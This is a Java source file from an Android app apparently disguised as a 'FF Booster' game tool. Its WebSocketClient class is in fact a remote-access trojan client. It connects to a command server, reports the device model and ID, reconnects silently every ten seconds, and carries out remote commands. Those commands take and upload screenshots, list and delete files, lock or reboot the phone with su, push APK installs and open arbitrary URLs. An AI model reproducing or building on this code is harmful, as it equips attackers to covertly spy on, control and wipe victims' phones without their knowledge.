package com.ffbooster.panel;

import android.app.ActivityManager;
import android.content.Context;
import android.hardware.Camera;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.util.Log;
import android.view.KeyEvent;
import android.content.Intent;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.List;

public class WebSocketClient {
    private static final String TAG = "FFBooster_WSClient";
    private Socket socket;
    private String serverUrl;
    private String deviceId;
    private String username;
    private Context context;
    private boolean connected = false;
    private OutputStream outputStream;
    
    public WebSocketClient(String serverUrl, String deviceId, String username, Context context) {
        this.serverUrl = serverUrl.replace("http://", "").replace("https://", "");
        this.deviceId = deviceId;
        this.username = username;
        this.context = context;
    }
    
    public void connect() {
        try {
            String[] parts = serverUrl.split(":");
            String host = parts[0];
            int port = parts.length > 1 ? Integer.parseInt(parts[1]) : 3000;
            
            socket = new Socket(host, port);
            outputStream = socket.getOutputStream();
            
            JSONObject auth = new JSONObject();
            auth.put("type", "auth");
            auth.put("username", username);
            auth.put("device_id", deviceId);
            auth.put("model", Build.MODEL);
            auth.put("android_version", Build.VERSION.RELEASE);
            
            send(auth.toString());
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                handleCommand(line);
            }
        } catch (Exception e) {
            Log.e(TAG, "Connection error", e);
            try {
                Thread.sleep(10000);
                connect();
            } catch (InterruptedException ie) {
                Log.e(TAG, "Reconnect sleep interrupted", ie);
            }
        }
    }
    
    private void handleCommand(String jsonStr) {
        try {
            JSONObject cmd = new JSONObject(jsonStr);
            String type = cmd.optString("type", "");
            String command = cmd.optString("command", "");
            
            switch (type) {
                case "ping":
                    JSONObject pong = new JSONObject();
                    pong.put("type", "pong");
                    send(pong.toString());
                    break;
                    
                case "command":
                    executeCommand(command, cmd);
                    break;
            }
        } catch (JSONException e) {
            Log.e(TAG, "Command parse error", e);
        }
    }
    
    private void executeCommand(String command, JSONObject data) {
        try {
            switch (command) {
                case "screenshot":
                    captureScreen();
                    break;
                    
                case "lock":
                    lockDevice();
                    break;
                    
                case "unlock":
                    unlockDevice();
                    break;
                    
                case "reboot":
                    rebootDevice();
                    break;
                    
                case "flashlight_on":
                    toggleFlashlight(true);
                    break;
                    
                case "flashlight_off":
                    toggleFlashlight(false);
                    break;
                    
                case "play_sound":
                    playSound(data.optString("url"));
                    break;
                    
                case "stop_sound":
                    stopSound();
                    break;
                    
                case "open_url":
                    openUrl(data.optString("url"));
                    break;
                    
                case "install_apk":
                    installApk(data.optString("url"));
                    break;
                    
                case "change_wallpaper":
                    changeWallpaper(data.optString("url"));
                    break;
                    
                case "vibrate":
                    vibrateDevice();
                    break;
                    
                case "get_files":
                    getFiles(data.optString("path", "/sdcard/"));
                    break;
                    
                case "delete_file":
                    deleteFile(data.optString("path"));
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Command execution error", e);
        }
    }
    
    private void captureScreen() {
        try {
            Process process = Runtime.getRuntime().exec("screencap -p /data/local/tmp/screen.png");
            process.waitFor();
            
            java.io.File file = new java.io.File("/data/local/tmp/screen.png");
            if (file.exists()) {
                byte[] data = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(file.getAbsolutePath()));
                String base64 = android.util.Base64.encodeToString(data, android.util.Base64.DEFAULT);
                
                JSONObject response = new JSONObject();
                response.put("type", "screenshot_result");
                response.put("data", base64);
                send(response.toString());
                
                file.delete();
            }
        } catch (Exception e) {
            Log.e(TAG, "Screenshot error", e);
        }
    }
    
    private void lockDevice() {
        try {
            DeviceAdmin admin = new DeviceAdmin();
            admin.lockDevice(context);
        } catch (Exception e) {
            Log.e(TAG, "Lock error", e);
        }
    }
    
    private void unlockDevice() {
        try {
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "FFBooster::unlock");
            wakeLock.acquire(3000);
        } catch (Exception e) {
            Log.e(TAG, "Unlock error", e);
        }
    }
    
    private void rebootDevice() {
        try {
            Runtime.getRuntime().exec("su -c reboot");
        } catch (Exception e) {
            Log.e(TAG, "Reboot error", e);
        }
    }
    
    private void toggleFlashlight(boolean on) {
        try {
            Camera camera = Camera.open();
            Camera.Parameters params = camera.getParameters();
            params.setFlashMode(on ? Camera.Parameters.FLASH_MODE_TORCH : Camera.Parameters.FLASH_MODE_OFF);
            camera.setParameters(params);
            if (on) {
                camera.startPreview();
            } else {
                camera.stopPreview();
                camera.release();
            }
        } catch (Exception e) {
            Log.e(TAG, "Flashlight error", e);
        }
    }
    
    private MediaPlayer mediaPlayer;
    
    private void playSound(String url) {
        try {
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(context, Uri.parse(url));
            mediaPlayer.prepare();
            mediaPlayer.start();
        } catch (Exception e) {
            Log.e(TAG, "Play sound error", e);
        }
    }
    
    private void stopSound() {
        try {
            if (mediaPlayer != null && mediaPlayer.isPlaying()) {
                mediaPlayer.stop();
                mediaPlayer.release();
            }
        } catch (Exception e) {
            Log.e(TAG, "Stop sound error", e);
        }
    }
    
    private void openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse(url));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Open URL error", e);
        }
    }
    
    private void installApk(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.parse(url), "application/vnd.android.package-archive");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Install APK error", e);
        }
    }
    
    private void changeWallpaper(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_ATTACH_DATA);
            intent.addCategory(Intent.CATEGORY_DEFAULT);
            intent.setDataAndType(Uri.parse(url), "image/*");
            intent.putExtra("mimeType", "image/*");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(Intent.createChooser(intent, "Set as wallpaper"));
        } catch (Exception e) {
            Log.e(TAG, "Change wallpaper error", e);
        }
    }
    
    private void vibrateDevice() {
        try {
            android.os.Vibrator vibrator = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
            if (vibrator != null) {
                vibrator.vibrate(500);
            }
        } catch (Exception e) {
            Log.e(TAG, "Vibrate error", e);
        }
    }
    
    private void getFiles(String path) {
        try {
            java.io.File dir = new java.io.File(path);
            java.io.File[] files = dir.listFiles();
            
            JSONObject response = new JSONObject();
            response.put("type", "files_list");
            response.put("path", path);
            
            if (files != null) {
                org.json.JSONArray fileArray = new org.json.JSONArray();
                for (java.io.File file : files) {
                    JSONObject fileObj = new JSONObject();
                    fileObj.put("name", file.getName());
                    fileObj.put("size", file.length());
                    fileObj.put("is_dir", file.isDirectory());
                    fileArray.put(fileObj);
                }
                response.put("files", fileArray);
            }
            
            send(response.toString());
        } catch (Exception e) {
            Log.e(TAG, "Get files error", e);
        }
    }
    
    private void deleteFile(String path) {
        try {
            java.io.File file = new java.io.File(path);
            if (file.exists()) {
                file.delete();
                
                JSONObject response = new JSONObject();
                response.put("type", "file_deleted");
                response.put("path", path);
                response.put("success", true);
                send(response.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Delete file error", e);
        }
    }
    
    private void send(String data) {
        try {
            if (outputStream != null) {
                outputStream.write(data.getBytes());
                outputStream.write('\n');
                outputStream.flush();
            }
        } catch (Exception e) {
            Log.e(TAG, "Send error", e);
        }
    }
}
